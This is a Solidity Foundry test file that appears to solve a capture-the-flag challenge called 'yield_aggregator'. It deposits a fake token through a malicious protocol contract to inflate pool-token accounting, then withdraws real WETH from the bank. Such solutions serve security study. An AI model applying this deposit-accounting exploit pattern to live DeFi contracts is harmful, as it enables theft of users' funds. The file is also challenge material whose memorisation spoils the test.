// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/console.sol";
import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../yield_aggregator/Setup.sol";
import "../yield_aggregator/YieldAggregator.sol";
import "../yield_aggregator/Exploit.sol";

contract YieldAggregatorTest is DSTest {
    Vm public constant vm = Vm(HEVM_ADDRESS);
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Setup setup;
    YieldAggregator aggregator;
    MiniBank bank;

    function setUp() public {
        setup = new Setup{value: 100 ether}();
        aggregator = setup.aggregator();
        bank = setup.bank();
    }

    function testSolved() public {
        console.log("Pool tokens start:", aggregator.poolTokens(address(this)));

        ExploitProtocol exploitProtocol = new ExploitProtocol();
        ExploitToken exploitToken = new ExploitToken();

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(exploitToken);
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 100 ether;
        aggregator.deposit(Protocol(exploitProtocol), _tokens, _amounts);

        console.log(
            "Pool tokens after exploit deposit:",
            aggregator.poolTokens(address(this))
        );

        _tokens[0] = address(weth);
        _amounts[0] = 50 ether;
        aggregator.withdraw(bank, _tokens, _amounts);

        assertTrue(setup.isSolved());
    }
}
